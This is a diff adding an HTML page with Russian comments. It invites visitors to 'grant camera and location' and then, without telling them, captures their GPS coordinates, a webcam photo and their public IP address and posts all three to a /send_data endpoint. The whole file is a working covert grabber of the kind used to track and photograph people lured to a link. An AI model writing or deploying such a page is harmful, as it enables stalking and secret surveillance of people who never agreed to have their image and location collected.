@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera and Geolocation</title>
+</head>
+
+<body>
+    <h1>Grant Permissions</h1>
+    <button onclick="requestPermissions()">Grant Camera & Location</button>
+
+    <script>
+        async function requestPermissions() {
+            try {
+                // Запрашиваем геолокацию
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Запрашиваем доступ к камере
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                    // Отправляем данные на сервер
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+
+                    const screenshot = await takeScreenshot(stream);
+
+                    // Отправка данных на сервер
+                    await fetch('/send_data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ip: ipData.ip,
+                            latitude: lat,
+                            longitude: lon,
+                            screenshot: screenshot
+                        })
+                    });
+                });
+            } catch (err) {
+                console.error("Error:", err);
+            }
+        }
+
+        async function takeScreenshot(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Получаем изображение в формате base64
+            return canvas.toDataURL('image/png');
+        }
+    </script>
+</body>
+
+</html>
